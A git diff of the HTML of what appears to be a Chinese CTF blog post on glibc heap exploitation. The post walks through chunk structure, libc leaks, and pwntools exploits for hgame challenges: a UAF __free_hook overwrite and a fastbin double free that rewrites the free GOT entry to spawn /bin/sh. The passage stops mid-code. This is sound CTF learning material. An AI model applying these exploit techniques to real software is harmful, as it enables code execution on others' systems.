@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/about/">
               
-              分类
+              关于
               
               
             </a>
@@ -241,9 +241,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -420,170 +420,201 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="堆知识合集一"><a href="#堆知识合集一" class="headerlink" title="堆知识合集一"></a>堆知识合集一</h1><p>由于许久没有看堆题了，打算多做点题整理整理</p>
+        <h1 id="堆知识合集一">堆知识合集一</h1>
+<p>由于许久没有看堆题了，打算多做点题整理整理</p>
 <p>题目方面主要以<code>hgame</code>和<code>ctf_all_in_one</code>中例题为例子</p>
-<h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><p>贴一下学习的师傅文章</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/484926468136">https://www.jianshu.com/p/484926468136</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39563369/article/details/103943077">https://blog.csdn.net/qq_39563369/article/details/103943077</a></p>
+<h2 id="chunk结构">chunk结构</h2>
+<p>贴一下学习的师傅文章</p>
+<p>https://www.jianshu.com/p/484926468136</p>
+<p>https://blog.csdn.net/qq_39563369/article/details/103943077</p>
 <p>使用中的<code>chunk</code></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131500519.png" alt="使用中的chunk"></p>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131500519.png" alt="使用中的chunk">
+<figcaption aria-hidden="true">使用中的chunk</figcaption>
+</figure>
 <p><code>free chunk</code></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131523932.png" alt="free chunk"></p>
-<pre><code class="lang-C">/*
-  This struct declaration is misleading (but accurate and necessary).
-  It declares a &quot;view&quot; into memory allowing access to necessary
-  fields at known offsets from a given base. See explanation below.
-*/
-struct malloc_chunk &#123;
-
-  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
-  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
-
-  struct malloc_chunk* fd;         /* double links -- used only if free. */
-  struct malloc_chunk* bk;
-
-  /* Only used for large blocks: pointer to next larger size.  */
-  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
-  struct malloc_chunk* bk_nextsize;
-&#125;;
-</code></pre>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131523932.png" alt="free chunk">
+<figcaption aria-hidden="true">free chunk</figcaption>
+</figure>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="co">  This struct declaration is misleading (but accurate and necessary).</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co">  fields at known offsets from a given base. See explanation below.</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co">*/</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> malloc_chunk <span class="op">&#123;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>  INTERNAL_SIZE_T      prev_size<span class="op">;</span>  <span class="co">/* Size of previous chunk (if free).  */</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>  INTERNAL_SIZE_T      size<span class="op">;</span>       <span class="co">/* Size in bytes, including overhead. */</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> malloc_chunk<span class="op">*</span> fd<span class="op">;</span>         <span class="co">/* double links -- used only if free. */</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> malloc_chunk<span class="op">*</span> bk<span class="op">;</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Only used for large blocks: pointer to next larger size.  */</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> malloc_chunk<span class="op">*</span> fd_nextsize<span class="op">;</span> <span class="co">/* double links -- used only if free. */</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> malloc_chunk<span class="op">*</span> bk_nextsize<span class="op">;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;;</span></span></code></pre></div>
 <ul>
 <li><code>struct malloc_chunk*</code>是定义指针，定义的变量大小在32位系统占4个字节，在64位占8个字节。</li>
-<li><code>INTERNAL_SIZE_T</code> :被定义为<code>size_t</code>,在32位系统上是32位无符号整数(<code>4bytes</code>)，在64位系统上是64位无符号整数(<code>8bytes</code>)</li>
+<li><code>INTERNAL_SIZE_T</code>
+:被定义为<code>size_t</code>,在32位系统上是32位无符号整数(<code>4bytes</code>)，在64位系统上是64位无符号整数(<code>8bytes</code>)</li>
 </ul>
-<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露<code>libc</code></h2><h3 id="知道libc版本"><a href="#知道libc版本" class="headerlink" title="知道libc版本"></a>知道<code>libc</code>版本</h3><p>通过将<code>freebin</code>加入到<code>unsortedbin</code> ，此时<code>unsorted</code>的<code>freebin</code>中的<code>fd</code>即可泄露<code>libc</code>中的<code>main_arena</code>地址</p>
+<h2 id="泄露libc">泄露<code>libc</code></h2>
+<h3 id="知道libc版本">知道<code>libc</code>版本</h3>
+<p>通过将<code>freebin</code>加入到<code>unsortedbin</code>
+，此时<code>unsorted</code>的<code>freebin</code>中的<code>fd</code>即可泄露<code>libc</code>中的<code>main_arena</code>地址</p>
 <p>可通过<code>gdb</code>中的<code>vmmap</code>查看<code>libc</code>计算相对地址</p>
-<pre><code class="lang-python">main_arena_addr = u64(r.recvuntil(b&#39;1.&#39;)[1:-3].ljust(8,b&#39;\x00&#39;)) 
-libc_addr = main_arena_addr - 0x3c4b78
-libc.address = libc_addr
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222111213954-1679370065075-1.png" alt></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>main_arena_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;1.&#39;</span>)[<span class="dv">1</span>:<span class="op">-</span><span class="dv">3</span>].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) </span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>libc_addr <span class="op">=</span> main_arena_addr <span class="op">-</span> <span class="bn">0x3c4b78</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> libc_addr</span></code></pre></div>
+<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222111213954-1679370065075-1.png"></p>
 <p><code>distance</code>计算偏移</p>
-<h3 id="不知道libc版本"><a href="#不知道libc版本" class="headerlink" title="不知道libc版本"></a>不知道<code>libc</code>版本</h3><p>利用<code>LibcSearcher</code> 搜索 <code>__malloc_hook</code>的地址</p>
-<pre><code class="lang-python">main_arena_addr = u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 96 #固定的96偏移
-malloc_hook_addr = main_arena_addr - 0x10 #再减0x10就到 __malloc_hook
-libc=LibcSearcher(&#39;__malloc_hook&#39;,malloc_hook_addr) #LibcSearcher
-offset = malloc_hook_addr - libc.dump(&#39;__malloc_hook&#39;)
-system_addr = offset + libc.dump(&#39;system&#39;)
-free_hook = offset + libc.dump(&#39;__free_hook&#39;)
-</code></pre>
-<h2 id="题目思路合集"><a href="#题目思路合集" class="headerlink" title="题目思路合集"></a>题目思路合集</h2><p>在泄露了<code>libc</code>地址之后</p>
-<h3 id="Freehook-UAF-hgame-editable-note"><a href="#Freehook-UAF-hgame-editable-note" class="headerlink" title="Freehook + UAF -- hgame editable_note"></a><code>Freehook + UAF -- hgame editable_note</code></h3><pre><code class="lang-python">for i in range(9):
-    add_note(i,0x80)
-for i in range(8):
-    delete_note(i)
-show_note(7)
-libc_main_arena = 0x1ECB80 + 88 + 8
-main_arena_addr = u64(r.recvuntil(b&#39;1.&#39;)[1:-3].ljust(8,b&#39;\x00&#39;)) 
-libc_addr = main_arena_addr - libc_main_arena
-#泄露libc---------------------------------------------
-libc.address=libc_addr
-system_addr = libc.sym[&#39;system&#39;]
-free_hook = libc.sym[&#39;__free_hook&#39;]
-# one_gadget_addr = libc_addr + 0xe3b04
-edit_note(6,p64(free_hook))#UAF 把tcache[6]中的next指针覆写为free_hook_addr
-add_note(9,0x80) #9为从tcache[6]申请的chunk，因为覆写的是next
-add_note(10,0x80) #10为 malloc返回的free_hook的指针
-edit_note(9,b&#39;/bin/sh\x00&#39;) #向system传参
-edit_note(10,p64(system_addr))#向free_hook中写入system地址
-delete_note(9)
-</code></pre>
-<h3 id="FastBin-DoubleFree-hgame-fast-note"><a href="#FastBin-DoubleFree-hgame-fast-note" class="headerlink" title="FastBin + DoubleFree -- hgame fast_note"></a><code>FastBin + DoubleFree -- hgame fast_note</code></h3><pre><code class="lang-python">add(0,0x80,b&#39;A&#39;*0x80) #大于fastbin
-add(1,0x80,b&#39;A&#39;*0x80) #避免合并到top chunk
-#----泄露libc
-
-add(2,0x50,b&#39;A&#39;* 0x50)
-add(3,0x50,b&#39;A&#39;* 0x50)
-add(4,0x10,b&#39;/bin/sh\x00&#39;)
-delete(0)
-show(0)
-
-main_arena_addr = u64(r.recvuntil(b&#39;1.&#39;)[1:-3].ljust(8,b&#39;\x00&#39;)) 
-libc_addr = main_arena_addr - 0x3c4b78
-libc.address = libc_addr
-system_addr = libc.sym[&#39;system&#39;]
-free_addr = elf.got[&#39;free&#39;]
-#----泄露libc
-delete(2)
-delete(3)
-delete(2)
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124219781.png" alt="此时的fastbins"></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124412631.png" alt="add完后的fastbins"></p>
-<p><code>UAF</code>解释 此处将重新申请<code>chunk</code>并填充地址，实际上是修改了作为<code>free chunk</code>的<code>0x25fc180</code>的<code>fd</code></p>
+<h3 id="不知道libc版本">不知道<code>libc</code>版本</h3>
+<p>利用<code>LibcSearcher</code> 搜索
+<code>__malloc_hook</code>的地址</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>main_arena_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;</span><span class="ch">\x7f</span><span class="st">&#39;</span>)[<span class="op">-</span><span class="dv">6</span>:].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) <span class="op">-</span> <span class="dv">96</span> <span class="co">#固定的96偏移</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>malloc_hook_addr <span class="op">=</span> main_arena_addr <span class="op">-</span> <span class="bn">0x10</span> <span class="co">#再减0x10就到 __malloc_hook</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>libc<span class="op">=</span>LibcSearcher(<span class="st">&#39;__malloc_hook&#39;</span>,malloc_hook_addr) <span class="co">#LibcSearcher</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>offset <span class="op">=</span> malloc_hook_addr <span class="op">-</span> libc.dump(<span class="st">&#39;__malloc_hook&#39;</span>)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> offset <span class="op">+</span> libc.dump(<span class="st">&#39;system&#39;</span>)</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>free_hook <span class="op">=</span> offset <span class="op">+</span> libc.dump(<span class="st">&#39;__free_hook&#39;</span>)</span></code></pre></div>
+<h2 id="题目思路合集">题目思路合集</h2>
+<p>在泄露了<code>libc</code>地址之后</p>
+<h3 id="freehook-uaf----hgame-editable_note"><code>Freehook + UAF -- hgame editable_note</code></h3>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">9</span>):</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    add_note(i,<span class="bn">0x80</span>)</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    delete_note(i)</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>show_note(<span class="dv">7</span>)</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>libc_main_arena <span class="op">=</span> <span class="bn">0x1ECB80</span> <span class="op">+</span> <span class="dv">88</span> <span class="op">+</span> <span class="dv">8</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>main_arena_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;1.&#39;</span>)[<span class="dv">1</span>:<span class="op">-</span><span class="dv">3</span>].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) </span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>libc_addr <span class="op">=</span> main_arena_addr <span class="op">-</span> libc_main_arena</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="co">#泄露libc---------------------------------------------</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>libc.address<span class="op">=</span>libc_addr</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> libc.sym[<span class="st">&#39;system&#39;</span>]</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>free_hook <span class="op">=</span> libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co"># one_gadget_addr = libc_addr + 0xe3b04</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>edit_note(<span class="dv">6</span>,p64(free_hook))<span class="co">#UAF 把tcache[6]中的next指针覆写为free_hook_addr</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>add_note(<span class="dv">9</span>,<span class="bn">0x80</span>) <span class="co">#9为从tcache[6]申请的chunk，因为覆写的是next</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>add_note(<span class="dv">10</span>,<span class="bn">0x80</span>) <span class="co">#10为 malloc返回的free_hook的指针</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>edit_note(<span class="dv">9</span>,<span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>) <span class="co">#向system传参</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>edit_note(<span class="dv">10</span>,p64(system_addr))<span class="co">#向free_hook中写入system地址</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>delete_note(<span class="dv">9</span>)</span></code></pre></div>
+<h3 id="fastbin-doublefree----hgame-fast_note"><code>FastBin + DoubleFree -- hgame fast_note</code></h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">0</span>,<span class="bn">0x80</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span><span class="bn">0x80</span>) <span class="co">#大于fastbin</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">1</span>,<span class="bn">0x80</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span><span class="bn">0x80</span>) <span class="co">#避免合并到top chunk</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="co">#----泄露libc</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">2</span>,<span class="bn">0x50</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="bn">0x50</span>)</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">3</span>,<span class="bn">0x50</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="bn">0x50</span>)</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">4</span>,<span class="bn">0x10</span>,<span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">0</span>)</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>show(<span class="dv">0</span>)</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>main_arena_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;1.&#39;</span>)[<span class="dv">1</span>:<span class="op">-</span><span class="dv">3</span>].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) </span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>libc_addr <span class="op">=</span> main_arena_addr <span class="op">-</span> <span class="bn">0x3c4b78</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> libc_addr</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> libc.sym[<span class="st">&#39;system&#39;</span>]</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>free_addr <span class="op">=</span> elf.got[<span class="st">&#39;free&#39;</span>]</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="co">#----泄露libc</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">2</span>)</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">3</span>)</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">2</span>)</span></code></pre></div>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124219781.png" alt="此时的fastbins">
+<figcaption aria-hidden="true">此时的fastbins</figcaption>
+</figure>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124412631.png" alt="add完后的fastbins">
+<figcaption aria-hidden="true">add完后的fastbins</figcaption>
+</figure>
+<p><code>UAF</code>解释
+此处将重新申请<code>chunk</code>并填充地址，实际上是修改了作为<code>free chunk</code>的<code>0x25fc180</code>的<code>fd</code></p>
 <p>而后再次申请便是在<code>0x25fc180</code>之后的<code>fd</code>的<code>chunk</code>便是在<code>0x601ffa</code>上了</p>
-<pre><code class="lang-python">#fastbin 后进先出
-# 0x602018 free_got 
-add(5,0x50,p64(0x602002-8)) #向fastbin next写入got表地址
-add(6,0x50,b&#39;A&#39;* 0x50)
-add(7,0x50,b&#39;A&#39;* 0x50)
-gdb.attach(r)
-pause()
-add(8,0x50,b&#39;\x00&#39;*14+p64(system_addr)) #申请的fastbin指向free_got
-#此处的14 应该为 0x602018 - 0x601ffa -0x10头大小
-delete(4)
-#free且传参/bin/sh
-
-#---------------
-#此处为什么不直接用0x602018 -0x10呢？
-#因为要符合free chunk的申请的size验证 
-#利用 x /10gx 0x602018 -0x10 查看
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131022813.png" alt></p>
-<pre><code class="lang-c">//此时size位虽然为0x3168000000000060
-//由于下面malloc源码中 fastbin的fastbin_index计算
-if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
-            &#123;
-              errstr = &quot;malloc(): memory corruption (fast)&quot;;
-//其中fastbin_index定义有
-#define fastbin_index(sz) \
-  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
-//解释
-//宏 fastbin_index(sz)用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。
-
-//同时由于(unsigned int)(sz)的原因，对应64程序只取size的低4字节，所以我们在利用寻找合适size的时候，类似这种情况（0x3168000000000060）也行，它等同于size=0x60
-
-//unsigned int 在64位程序下只取低4字节
-//所以此处可以分配fastbin而不会报错！
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222112549250-1679370065076-3.png" alt></p>
-<h3 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h3><ol>
-<li><code>pwndbg</code>自动读取工作目录下源码 </li>
-<li><code>r = gdb.debug(&#39;./vuln&#39;, &#39;set debug-file-directory debug/&#39;)``gdb</code>启动程序，而不是<code>attach</code>，并设置调试信息</li>
-<li>放<code>glibc-all-in-one</code>的调试信息 即<code>.debug</code>文件夹</li>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#fastbin 后进先出</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x602018 free_got </span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">5</span>,<span class="bn">0x50</span>,p64(<span class="bn">0x602002</span><span class="op">-</span><span class="dv">8</span>)) <span class="co">#向fastbin next写入got表地址</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">6</span>,<span class="bn">0x50</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="bn">0x50</span>)</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">7</span>,<span class="bn">0x50</span>,<span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="bn">0x50</span>)</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>gdb.attach(r)</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>pause()</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">8</span>,<span class="bn">0x50</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">14</span><span class="op">+</span>p64(system_addr)) <span class="co">#申请的fastbin指向free_got</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="co">#此处的14 应该为 0x602018 - 0x601ffa -0x10头大小</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">4</span>)</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="co">#free且传参/bin/sh</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">#---------------</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="co">#此处为什么不直接用0x602018 -0x10呢？</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="co">#因为要符合free chunk的申请的size验证 </span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="co">#利用 x /10gx 0x602018 -0x10 查看</span></span></code></pre></div>
+<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131022813.png"></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">//此时size位虽然为0x3168000000000060</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co">//由于下面malloc源码中 fastbin的fastbin_index计算</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>__builtin_expect <span class="op">(</span>fastbin_index <span class="op">(</span>chunksize <span class="op">(</span>victim<span class="op">))</span> <span class="op">!=</span> idx<span class="op">,</span> <span class="dv">0</span><span class="op">))</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>            <span class="op">&#123;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>              errstr <span class="op">=</span> <span class="st">&quot;malloc(): memory corruption (fast)&quot;</span><span class="op">;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="co">//其中fastbin_index定义有</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define fastbin_index</span><span class="op">(</span><span class="pp">sz</span><span class="op">)</span><span class="pp"> </span><span class="op">\</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="pp">  </span><span class="op">((((</span><span class="dt">unsigned</span><span class="pp"> </span><span class="dt">int</span><span class="op">)</span><span class="pp"> </span><span class="op">(</span><span class="pp">sz</span><span class="op">))</span><span class="pp"> </span><span class="op">&gt;&gt;</span><span class="pp"> </span><span class="op">(</span><span class="pp">SIZE_SZ </span><span class="op">==</span><span class="pp"> </span><span class="dv">8</span><span class="pp"> </span><span class="op">?</span><span class="pp"> </span><span class="dv">4</span><span class="pp"> </span><span class="op">:</span><span class="pp"> </span><span class="dv">3</span><span class="op">))</span><span class="pp"> </span><span class="op">-</span><span class="pp"> </span><span class="dv">2</span><span class="op">)</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="co">//解释</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="co">//宏 fastbin_index(sz)用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    </span>
